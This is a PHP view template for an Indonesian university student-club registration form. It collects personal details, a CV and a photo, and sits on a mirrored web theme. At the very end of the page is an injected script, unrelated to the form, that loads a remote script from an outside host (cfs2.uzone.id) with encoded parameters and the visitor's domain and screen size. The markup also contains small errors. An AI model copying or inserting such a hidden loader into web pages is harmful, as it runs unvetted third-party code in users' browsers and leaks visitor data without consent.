
<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/22-enstruct-checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:49 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>|| &nbsp; InterUKM</title>
    <meta name="keywords" content="">
    <meta name="description" content="">
    <meta name="author" content="">

    <!-- favicon -->
    <link rel="shortcut icon" type="image/png" href="favicon.png" /> 

    <!-- GOOGLE FONT -->
    <link href="https://fonts.googleapis.com/css?family=Poppins:400,500,600%7CRoboto:400,500,700" rel="stylesheet">

    <!-- CSS LIBRARY -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/bootstrap.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/animate.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/font-awesome.min.css'); ?>">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/lib/hover.css'); ?>">

    <!-- Style Sheets -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/bootstrap-datetimepicker.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery.bxslider.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/jquery-ui.min.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/swiper.min.css'); ?>" /> 


    <!-- Main css -->
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/style.css'); ?>" />
    <link rel="stylesheet" type="text/css" href="<?php echo base_url('assets/css/responsive.css'); ?>" />

    <!--[if lt IE 8]>
      <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
  <![endif]-->
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>

      <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
      <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
</head>

<body>
   <?php
    include 'header.php';
   ?>
    <!--header ends-->
    
    <main>
        <section class="primary-padding shopping-block ">
            <div class="container">
                <div class="row">
                    <div class="col-md-12 col-sm-12 ">
                        <div class="main-title text-center wow fadeInUp">
                            <h2>Pendaftaran Pengurus UKM</h2>
                        </div>
                    </div>
                </div>
                <!--title-->

                <div class="shop-main cart-page ">
                    <div class="row">
                        <div class="col-md-12 col-sm-12">
                            <div class="woocommerce">
                                <form method="post" class="checkout woocommerce-checkout" action="<?php echo site_url('ukm/input_data_pengurus'); ?>" enctype="multipart/form-data">
                                    <div class="col2-set" id="customer_details">
                                    <?php 
                                        $pesan = $this->session->flashdata('pesan');
                                        if (isset($pesan)): ?>
                                        <div class="alert alert-<?= $pesan["class"] ?> alert-dismissible fade show" role="alert">
                                          <strong><?= $pesan["title"]; ?></strong> <?= $pesan["message"]; ?>
                                        </div>
                                    <?php endif ?>                                 
                                        <div class="col-1">
                                            <div class="woocommerce-billing-fields">
                                                <h4 class="title">Formulir Pendaftaran</h4>
                                                <div class="row">
                                                    <div class="col-md-8 col-sm-8">
                                                        <div class="form-group">
                                                           <b>Nama</b>
                                                            <input type="text" placeholder="Nama Mahasiswa *" name="nama">
                                                            <?php echo form_error('nama'); ?>
                                                        </div>
                                                        <div class="form-group">
                                                           <b>NIM</b>
                                                            <input type="text" placeholder="NIM Mahasiswa *" name="nim">
                                                            <?php echo form_error('nim'); ?>
                                                        </div>
                                                        <div class="form-group">
                                                           <b>Fakultas</b>
                                                           <select name="fakultas">
                                                               <option>FIT</option>
                                                               <option>FTE</option>
                                                           </select>
                                                           <?php echo form_error('fakultas'); ?>
                                                        </div>
                                                        <div class="form-group">
                                                           <b>Pilih UKM</b>
                                                           <select name="ukm">
                                                               <option>UKM Bola</option>
                                                               <option>UKM Bali</option>
                                                           </select>
                                                           <?php echo form_error('ukm'); ?>
                                                        </div>
                                                        <div class="form-group">
                                                           <b>Jurusan</b>
                                                            <input type="text" class="form-control" placeholder="Jurusan *" name="jurusan">
                                                            <?php echo form_error('jurusan'); ?>
                                                        </div> 
                                                        <div class="form-group">
                                                           <b>No. HP</b>
                                                            <input type="text" placeholder="Nomor Handphone *" name="nohp">
                                                            <?php echo form_error('nohp'); ?>
                                                        </div>  
                                                        <div class="form-group">
                                                           <b>Email</b>
                                                            <input type="text" placeholder="example@email.com *" name="email">
                                                            <?php echo form_error('email'); ?>
                                                        </div> 
                                                        <div class="form-group">
                                                           <b>Motivasi Masuk UKM</b>
                                                            <textarea placeholder="Minimal 300 kata" name="motivasi"></textarea>
                                                            <?php echo form_error('motivasi'); ?>
                                                        </div> 
                                                        <div class="form-group">
                                                           <b>Unggah CV</b>
                                                            <input type="file" class="form-control" name="cv">
                                                        </div>
                                                         <div class="form-group">
                                                           <b>Unggah Foto</b>
                                                            <input type="file" class="form-control" name="foto-profil" ccept="image/*">
                                                        </div 
                                                        <!-- order note -->
                                                    </div>

                                                </div>
                                                <div class="form-group" style="margin-top:50px;">
                                                    <input type="submit" value="Submit"class="btn bg-yellow txt-cap" style="color:white;">
                                                </div> 
                                            </div>

                                            <!--billing field-->
                                        </div>
                                    </div>
                                    <!--col set-->
                                    
                                    <!--order rwview-->
                                </form>
                            </div>
                            <!--wocommerce-->

                        </div>
                    </div>
                </div>
                <!--shop main-->
            </div>
        </section>
    </main>
    <!--main ends-->

   <?php
    include 'footer.php';
   ?>
    <!--footer-->
    <!--back to top-->
    <a href="#" class="scrollup"><i class="fa fa-angle-up"></i></a>
   
    <!-- Js libery -->
     <script src="<?php echo base_url('assets/js/jquery-3.1.1.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/tether.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/bootstrap.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/modernizr.js'); ?>"></script>

    <!--jquery ui-->
    <script src="<?php echo base_url('assets/js/jquery-ui.js'); ?>"></script>

    <!-- slider js -->
    <script src="<?php echo base_url('assets/js/jquery.bxslider.min.js'); ?>"></script>
    <script src="<?php echo base_url('assets/js/swiper.jquery.min.js'); ?>"></script>    

    <!-- wow -->
    <script src="<?php echo base_url('assets/js/wow.min.js'); ?>"></script>

    <!-- Parallax -->
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.parallax-1.1.3.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.localscroll-1.2.7-min.js'); ?>"></script>
    <script type="text/javascript" src="<?php echo base_url('assets/js/jquery.scrollTo-1.4.2-min.js'); ?>"></script>

    <!--datepicker-->
    <script src="<?php echo base_url('assets/js/bootstrap-datetimepicker.min.js'); ?>"></script>

    <!--counter-->
    <script src="<?php echo base_url('assets/js/jquery.countTo.js'); ?>"></script>

    <!--smooth scrollling-->
    <script src="<?php echo base_url('assets/js/jQuery.scrollSpeed.js'); ?>"></script>

    <!--Costom js-->
    <script src="<?php echo base_url('assets/js/main.js'); ?>"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssK%2fmsldK2DOE%2f%2fqAvf3iySfZ5vzCGTs7eo7p3D%2fsDdgzhdf1OnTVn3swlP6%2faMAMBtB5Iy57ytXQ%2bFw1MagwCukiBLVDjR15wlNYlsyUsUIfjq6Q6Rn5krORyBk%2bxz43xYDG6hb0OYcA2%2b%2fUgYZjCS%2bJFTnQZvgxneYAVSI5bbAjieKA%2fVY7hahWXUfB1rkgKsK05vTQ73duVN1CwviKyIPJXzBnrO%2fsl1KlDSRajKiTciIqsc53hSjc6uDTrkdghDF%2fjfiySdWTOV%2fz4oiKP2PJ%2f6riZKG6XxcbrzgHbatFiE%2bm%2fpn6SEAVPrSK7ZSFj%2fc2Cy34%2fJXedknT6U0XlBdW%2byTesUDWSUSeiO3BBYBssDC5IsPLr9Eacq7lgx9LzBjK3azB1BL1WM5X9OORfhZEeJERlx6KESFSsiqZ38gwg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from themes.webavenue.com.au/enstruct/html/22-enstruct-checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 16 Apr 2017 14:07:49 GMT -->
</html>
